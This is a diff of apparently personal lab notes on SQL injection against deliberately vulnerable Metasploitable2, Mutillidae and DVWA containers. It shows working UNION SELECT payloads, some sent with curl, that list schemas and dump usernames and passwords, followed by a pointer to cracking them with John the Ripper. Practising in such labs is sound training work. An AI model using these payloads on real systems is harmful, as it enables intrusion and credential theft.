@@ -1,5 +1,8 @@
 # SQL Injection
 
+- [Config Metasploitable2](./configMetasploitable2.md)
+- [Config Owasp](./ftp_user_config.md)
+
 ### Describe table columns
 First the one need to find how many columns there are in the table
 ```bash
@@ -28,87 +31,27 @@ curl 10.0.0.3?id="1%20UNION%20SELECT%201%2Ccolumn_name%2Ccolumn_type%2C4%20FROM%
 curl 10.0.0.3?id="1%20UNION%20SELECT%20%2A%20FROM%20customers%20--%20"
 
 ```
-### Config owasp container
-```bash
-owasp:
-  image: owasp/security-shepherd
-  container_name: owasp
-  ports:
-      - 83:8443
-  networks:
-      kali-app-network:
-          ipv4_address: 10.0.0.5
 
-docker exec -it -u 0 owasp bash
-
-netstat -tlp
-cat /usr/local/tomcat/conf/Security file && echo;
-
-exit
-
-docker exec -it -u 0 ubuntu bash
-./startServices
-mysql -u root -p
-CREATE USER 'admin'@'%' IDENTIFIED BY 'password';
-GRANT ALL PRIVILEGES ON *.* TO 'admin'@'%' WITH GRANT OPTION;
-FLUSH PRIVILEGES;
-EXIT;
-
-localhost:83
-```
-### Metasploitable2
-```bash
-metasploitable2:
-  image: tleemcjr/metasploitable2
-  tty: true
-  container_name: metasploitable2
-  ports:
-      - 83:80
-  volumes:
-      - ./:/home/gustavo
-  networks:
-      kali-app-network:
-          ipv4_address: 10.0.0.6
-docker exec -it -u 0 metasploitable2 sh
-nano /var/www/mutillidae/config.inc
-netstat -tlp | grep mysql
-
-http://localhost:83/mutillidae/index.php?page=user-info.php
-# owasp 10, A1 injection at menu
-```
-### Metasploitable2 Create DB
-```bash
-mysql -u root -p # no pass
-show databases;
-use metasploit;
-source /home/gustavo/users.sql;
-LOAD DATA INFILE '/home/gustavo/users.txt' into table accounts FIELDS TERMINATED BY ',' LINES TERMINATED BY '\n';
-select * from accounts;
-```
-### Metasploitable2 users.txt
-```
-gustavo,gustavo\n
-test,test\n
-```
-### Metasploitable2 users.sql
-```
-CREATE TABLE accounts (
-    id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
-    username VARCHAR(100) NOT NULL,
-    password VARCHAR(100) NOT NULL
-);
-```
 ### Metasploitable2 Injections
+The single quote is needed becase it ends the first raw query param value and<br>
+starts the sql injection statment.<br>
+The same is for the #, it comments the rest of the raw query, allowing the injection.<br>
 ```
 ' union select 1,2,3 #
+
 ' union select database(),user(),version() #
+
 # same as
 select database(); # at mysql terminal
 
 ' union select '',table_schema,table_name from information_schema.tables #
+
 ' union select '',column_name,'' from information_schema.columns where table_name='accounts' #
+
 ' union select '',username,password from accounts #
+
 ' union select '',column_name,'' from information_schema.columns where table_name='users' #
+
 ' union select '',concat(first_name,':',password),'' from dvwa.users #
 
 # crack passwords with John the Ripper
